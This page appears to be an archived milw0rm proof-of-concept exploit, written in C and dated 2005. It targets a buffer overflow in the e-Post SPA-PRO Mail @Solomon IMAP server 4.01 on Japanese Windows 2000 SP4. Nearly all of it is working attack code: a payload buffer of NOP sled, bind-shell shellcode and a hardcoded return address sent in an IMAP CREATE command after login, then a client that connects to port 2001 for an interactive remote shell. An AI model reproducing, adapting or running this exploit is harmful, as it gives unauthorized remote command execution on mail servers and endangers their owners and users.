<html><head><title>e-Post SPA-PRO 4.01 (imap) Remote Buffer Overflow Exploit</title></head><pre>//**************************************************************************
// e-Post SPA-PRO Mail @Solomon SPA-IMAP4S 4.01 Service Buffer Overflow 
// Vulnerability
//
// Bind Shell POC Exploit for Japanese Win2K SP4
// 31 May 2005
//
// This POC code binds shell on port 2001 of a vulnerable e-Post
// SPA-PRO Mail @Solomon IMAP server.
//
// This POC assumes default mailbox configuration C:\mail\inbox\%USERNAME%
// Any changes to the mailbox configuration will cause this POC to
// fail due to the length differences.
//
//
// Advisory 
// http://www.security.org.sg/vuln/spa-promail4.html
// http://www.security.org.sg/vuln/spa-promail4-jp.html
//
//**************************************************************************

#include &lt;stdio.h&gt;
#include &lt;conio.h&gt;
#include &lt;winsock2.h&gt;
#include &lt;windows.h&gt;
#pragma comment (lib,&quot;ws2_32.lib&quot;)


unsigned char expBuf[] = 
&quot;2 create \&quot;&quot;
&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
&quot;\x55\x8B\xEC\x33\xC9\x66\xB9\xE8\x03\x2B\xE1\x32\xC0\x8B\xFC\xF3&quot;
&quot;\xAA\xB1\x30\x64\x8B\x01\x8B\x40\x0C\x8B\x70\x1C\xAD\x8B\x70\x08&quot;
&quot;\xD9\xEE\xD9\x74\x24\xF4\x5F\x83\xC7\x0C\xEB\x53\x60\x8B\x6C\x24&quot;
&quot;\x24\x8B\x75\x3C\x8B\x74\x35\x78\x03\xF5\x8B\x7E\x20\x03\xFD\x8B&quot;
&quot;\x4E\x18\x56\x33\xDB\x8B\x37\x03\xF5\x33\xC0\x99\xAC\x85\xC0\x74&quot;
&quot;\x07\xC1\xCA\x0D\x03\xD0\xEB\xF4\x3B\x54\x24\x2C\x74\x09\x83\xC7&quot;
&quot;\x04\x43\xE2\xE1\x5E\xEB\x16\x5E\x8B\x7E\x24\x03\xFD\x66\x8B\x04&quot;
&quot;\x5F\x8B\x7E\x1C\x03\xFD\x8B\x04\x87\x01\x44\x24\x24\x61\xC3\x89&quot;
&quot;\x75\xF4\x68\x8E\x4E\x0E\xEC\x56\xFF\xD7\x59\x33\xC0\x66\xB8\x6C&quot;
&quot;\x6C\x50\x68\x33\x32\x2E\x64\x68\x77\x73\x32\x5F\x54\xFF\xD1\x8B&quot;
&quot;\xF0\x68\xD9\x09\xF5\xAD\x56\xFF\xD7\x5B\x83\xC4\x20\x6A\x01\x6A&quot;
&quot;\x02\xFF\xD3\x89\x45\xD0\x68\xA4\x1A\x70\xC7\x56\xFF\xD7\x5B\x33&quot;
&quot;\xC0\x50\xB8\xFD\xFF\xF8\x2E\x83\xF0\xFF\x50\x8B\xC4\x6A\x10\x50&quot;
&quot;\xFF\x75\xD0\xFF\xD3\x68\xA4\xAD\x2E\xE9\x56\xFF\xD7\x5B\xFF\x75&quot;
&quot;\xD0\xFF\xD3\x8B\xCC\x6A\x10\x8B\xDC\x68\x35\x54\x8A\xA1\x56\xFF&quot;
&quot;\xD7\x5A\x50\x50\x53\x51\xFF\x75\xD0\xFF\xD2\x8B\xD0\x68\xE7\x79&quot;
&quot;\xC6\x79\x56\xFF\xD7\x58\x89\x45\xF0\x8B\x75\xF4\x83\xC4\x20\xC6&quot;
&quot;\x04\x24\x44\xC6\x44\x24\x2D\x01\x89\x54\x24\x38\x89\x54\x24\x3C&quot;
&quot;\x89\x54\x24\x40\x8B\xC4\x8D\x58\x44\x68\x72\xFE\xB3\x16\x56\xFF&quot;
&quot;\xD7\x5A\xB9\xFF\x63\x6D\x64\xC1\xE9\x08\x51\x8B\xCC\x53\x53\x50&quot;
&quot;\x33\xC0\x50\x50\x50\x6A\x01\x50\x50\x51\x50\xFF\xD2\x5B\x68\xAD&quot;
&quot;\xD9\x05\xCE\x56\xFF\xD7\x58\x6A\xFF\xFF\x33\xFF\xD0\xFF\x74\x24&quot;
&quot;\x48\xFF\x55\xF0\xFF\x75\xD0\xFF\x55\xF0\x68\xEF\xCE\xE0\x60\x56&quot;
&quot;\xFF\xD7\x58\xFF\xD0\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
&quot;\xe9\x4f\xfe\xff\xff\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x54\x54\x54\x54&quot;
&quot;\x55\x55\x55\x55\x56\x56\x56\x56\x57\x57\x57\x57\xE9\x0C\xFE\xFF&quot;
&quot;\xFF\xCC\xEB\xa0\x5A\xD6\x19\xF8\x74\x41\x41\x41\x42\x42\x42\x42&quot;
&quot;\x43\x43\x43\x43\x44\x44\x44\x44\x45\x45\x45\x45\x46\x46\x46\x46&quot;
&quot;\x47\x47\x47\x47\x48\x48\x48\x48\x36\x49\x49\x49\x4A\x4A\x4A\x4A&quot;
&quot;\x4B\x4B\x4B\x4B\x4C\x4C\x4C\x4C\x4D\x4D\x4D\x4D\x4E\x4E\x4E\x4E&quot;
&quot;\x4F\x4F\x4F\x4F\x50\x50\x50\x50\x51\x51\x51\x51\x52\x52\x52\x52&quot;
&quot;\x53\x53\x53\x53\x54\x54\x54\x54\x55\x55\x55\x55\x56\x56\x56\x56&quot;
&quot;\x57\x57\x57\x57\x58\x58\x58\x58\x59\x59\x59\x59\x5A\x5A\x5A\x5A&quot;
&quot;\&quot;\r\n&quot;;


void shell(int sockfd)
{
	char buffer[1024];
	fd_set rset;
	FD_ZERO(&amp;rset);

	for(;;)
	{
		if(kbhit() != 0)
		{		
			fgets(buffer, sizeof(buffer) - 2, stdin);
			send(sockfd, buffer, strlen(buffer), 0);
		}

		FD_ZERO(&amp;rset);
		FD_SET(sockfd, &amp;rset);

		timeval tv;
		tv.tv_sec = 0;
		tv.tv_usec = 50;
		
		if(select(0, &amp;rset, NULL, NULL, &amp;tv) == SOCKET_ERROR)
		{
			printf(&quot;select error\n&quot;);
			break;
		}
        
		if(FD_ISSET(sockfd, &amp;rset))
		{
			int n;

			ZeroMemory(buffer, sizeof(buffer));
			if((n = recv(sockfd, buffer, sizeof(buffer), 0)) &lt;= 0)
			{
				printf(&quot;EOF\n&quot;);
				return;
			}
			else
			{
				fwrite(buffer, 1, n, stdout);
			}
		}
	}
}


#define ADDR_POSITION		534
#define RET_ADDR			0x74F819D6		// CALL EBX in Japanese Win2K SP4

// First short jump backwards. (EB AO) 
// You should know what to change here, landing onto INT 3 to let debugger kick in.
#define FIRST_BACKJMP_INST	0x5AA0EBCC


int main(int argc, char* argv[])
{
	WORD wVersionRequested;
	WSADATA wsaData;
	struct sockaddr_in sin;
	int err;
	char inBuffer[10000];
	char loginBuf[1000];

	if(argc != 4)
	{
		printf(&quot;\nUsage: %s &lt;imap username&gt; &lt;imap password&gt; &lt;ip addr&gt;\n&quot;, argv[0]);
		return 1;
	}

	if(strlen(argv[1]) &lt;= 0 || strlen(argv[1]) &gt; 20)
	{
		printf(&quot;\nInvalid IMAP username!  Maximum username length is 20.\n&quot;);
		return 1;
	}

	if(strlen(argv[2]) &lt;= 0 || strlen(argv[2]) &gt; 14)
	{
		printf(&quot;\nInvalid IMAP password!  Maximum password length is 14.\n&quot;);
		return 1;
	}

	memset(loginBuf, 0, sizeof(loginBuf));
	_snprintf(loginBuf, sizeof(loginBuf), &quot;1 login \&quot;%s\&quot; \&quot;%s\&quot;\r\n&quot;, argv[1], argv[2]);
	loginBuf[sizeof(loginBuf)-1] = 0;

	int retPos = ADDR_POSITION - (strlen(argv[1]) - 1);
	
	*((DWORD *)&amp;expBuf[retPos]) = RET_ADDR;
	*((DWORD *)&amp;expBuf[retPos-4]) = FIRST_BACKJMP_INST;


	wVersionRequested = MAKEWORD(2,0);
	err = WSAStartup(wVersionRequested, &amp;wsaData);
	if(err != 0)
	{
		printf(&quot;\nWSAStartup Error.\n&quot;);
		return 1;
	}

	if(LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 0)
	{
		printf(&quot;\nWinsock Version Error\n&quot;);
		WSACleanup();
		return 1;
	}

	SOCKET s = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);

	sin.sin_addr.s_addr = inet_addr(argv[3]);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(143);

	printf(&quot;\n[+] Trying to connect to %s\n&quot;, inet_ntoa(sin.sin_addr));

	if(connect(s, (sockaddr *)&amp;sin, sizeof(sin)) != SOCKET_ERROR)
	{
		int size;
			
		// read IMAP banner
		size = recv(s, inBuffer, sizeof(inBuffer), 0);
		if(size == SOCKET_ERROR)
		{
			printf(&quot;[-] Error receiving IMAP banner!\n&quot;);
			return 1;
		}

		printf(&quot;[+] IMAP banner received!\n\n&quot;);
		fwrite(inBuffer, 1, size, stdout);
		printf(&quot;\n&quot;);

		if(send(s, (char *)loginBuf, strlen((char *)loginBuf), 0) == SOCKET_ERROR)
		{
			printf(&quot;[-] Error sending login!\n&quot;);
			return 1;
		}

		printf(&quot;[+] Login Sent.\n&quot;);

		size = recv(s, inBuffer, sizeof(inBuffer), 0);
		if(size == SOCKET_ERROR)
		{
			printf(&quot;[-] Error receiving login reply!\n&quot;);
			return 1;
		}
		if(strstr(inBuffer, &quot;OK&quot;))
			printf(&quot;[+] Login successful!\n&quot;);
		else
		{
			printf(&quot;[+] Login failed!\n&quot;);
			return 1;
		}

		if(send(s, (char *)expBuf, strlen((char *)expBuf), 0) == SOCKET_ERROR)
		{
			printf(&quot;[-] Error sending exploit!\n&quot;);
			return 1;
		}
		else
		{
			printf(&quot;[+] Exploit sent!\n&quot;);
		}

		Sleep(2000);

		//================================= Connect to the target ==============================
		SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
		if(sock == INVALID_SOCKET)
		{
			printf(&quot;Invalid socket return in socket() call.\n&quot;);
			WSACleanup();
			return -1;
		}

		sin.sin_family = AF_INET;
		sin.sin_port = htons(2001);
		sin.sin_addr.s_addr = inet_addr(argv[3]);

		if(connect(sock, (sockaddr *)&amp;sin, sizeof(sin)) == SOCKET_ERROR)
		{
			printf(&quot;Exploit Failed. SOCKET_ERROR return in connect call.\n&quot;);
			closesocket(sock);
			WSACleanup();
			return -1;
		}
		
		printf(&quot;[+] Exploit successful!\n\n&quot;);
		shell(sock);
		closesocket(sock);	
	}
	else
	{
		printf(&quot;[-] Cannot connect!\n&quot;);
	}

	closesocket(s);
	WSACleanup();

	return 0;
}

// milw0rm.com [2005-06-02]</pre></html>